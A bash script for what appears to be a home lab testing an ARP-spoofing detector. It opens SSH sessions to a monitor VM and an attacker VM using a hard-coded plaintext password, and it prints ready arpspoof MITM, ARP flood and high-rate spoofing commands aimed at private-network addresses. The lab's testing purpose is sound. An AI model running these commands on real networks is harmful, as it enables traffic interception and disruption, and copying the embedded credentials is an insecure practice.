#!/bin/bash
# Direct VM Execution Script
# Sets up monitoring and attack in parallel

# VM Credentials
MONITOR_IP="192.168.128.8"
ATTACKER_IP="192.168.128.101"

MONITOR_USER="monitor"
ATTACKER_USER="achu"
VM_PASSWORD="achu2006"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${BLUE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║   ARP Attack Execution & Live Monitor Dashboard           ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Check if tmux is available (for multi-pane support)
if command -v tmux &> /dev/null; then
    echo -e "${YELLOW}Using tmux for multi-pane monitoring...${NC}"
    echo ""
    
    # Create new tmux session
    SESSION="securenet-arp"
    
    # Kill existing session if it exists
    tmux kill-session -t $SESSION 2>/dev/null || true
    
    # Create new session with multiple windows
    tmux new-session -d -s $SESSION -x 240 -y 60
    
    # Window 0: Monitor VM - Security Log Stream
    tmux send-keys -t $SESSION "echo '📊 Connecting to Monitor VM...'; sshpass -p $VM_PASSWORD ssh $MONITOR_USER@$MONITOR_IP 'cd ~/securenet && echo \"🔍 Real-time Security Events:\" && tail -f lan_security.log | grep -E \"ARP|Spoof|anomaly|Alert|Detect\"'" Enter
    sleep 2
    
    # Window 1: Monitor VM - System Stats
    tmux new-window -t $SESSION
    tmux send-keys -t $SESSION "echo '📈 Connecting to Monitor VM...'; sshpass -p $VM_PASSWORD ssh $MONITOR_USER@$MONITOR_IP 'cd ~/securenet && watch -n 1 \"echo \\\"Last 3 log entries:\\\"; tail -3 lan_security.log\"'" Enter
    sleep 2
    
    # Window 2: Attacker VM - Attack Control
    tmux new-window -t $SESSION
    tmux send-keys -t $SESSION "echo '🚀 Connecting to Attacker VM...'; sshpass -p $VM_PASSWORD ssh $ATTACKER_USER@$ATTACKER_IP 'bash -i -l'" Enter
    sleep 2
    
    echo -e "${GREEN}✓ Tmux session created with 3 panes!${NC}"
    echo ""
    echo -e "${CYAN}Session name: $SESSION${NC}"
    echo ""
    echo "To attach to the session:"
    echo -e "  ${YELLOW}tmux attach-session -t $SESSION${NC}"
    echo ""
    echo "Navigation:"
    echo -e "  ${YELLOW}Ctrl-B + n${NC}  = Next window"
    echo -e "  ${YELLOW}Ctrl-B + p${NC}  = Previous window"
    echo -e "  ${YELLOW}Ctrl-B + :kill-session${NC} = Exit when done"
    echo ""
    
    # Auto-attach
    read -p "Press Enter to attach to the session (Ctrl+B then : to exit)..."
    tmux attach-session -t $SESSION
    
else
    # Fallback: Manual instructions
    echo -e "${YELLOW}tmux not available. Use these commands in separate terminals:${NC}"
    echo ""
    
    echo -e "${CYAN}═══ Terminal 1 - Monitor VM (Real-time Logs) ═══${NC}"
    echo "sshpass -p achu2006 ssh monitor@192.168.128.8"
    echo "cd ~/securenet && tail -f lan_security.log | grep -E 'ARP|Spoof|anomaly'"
    echo ""
    
    echo -e "${CYAN}═══ Terminal 2 - Monitor VM (Live Stats) ═══${NC}"
    echo "sshpass -p achu2006 ssh monitor@192.168.128.8"
    echo "cd ~/securenet && watch -n 1 'tail -5 lan_security.log'"
    echo ""
    
    echo -e "${CYAN}═══ Terminal 3 - Attacker VM (Run Attacks) ═══${NC}"
    echo "sshpass -p achu2006 ssh achu@192.168.128.101"
    echo ""
    echo -e "${YELLOW}Then run these ARP attacks:${NC}"
    echo ""
    echo -e "${RED}# ARP Spoof (Single)${NC}"
    echo "  sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.1"
    echo ""
    echo -e "${RED}# ARP Spoof (Bidirectional MITM)${NC}"
    echo "  sudo arpspoof -i eth0 -t 192.168.128.6 192.168.128.8 &"
    echo "  sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.6"
    echo ""
    echo -e "${RED}# ARP Flood${NC}"
    echo "  sudo arping -i eth0 -c 1000 192.168.128.8"
    echo ""
    echo -e "${RED}# High-Rate ARP Spoof${NC}"
    echo "  timeout 30 sudo arpspoof -i eth0 -t 192.168.128.8 192.168.128.6"
    echo ""
fi
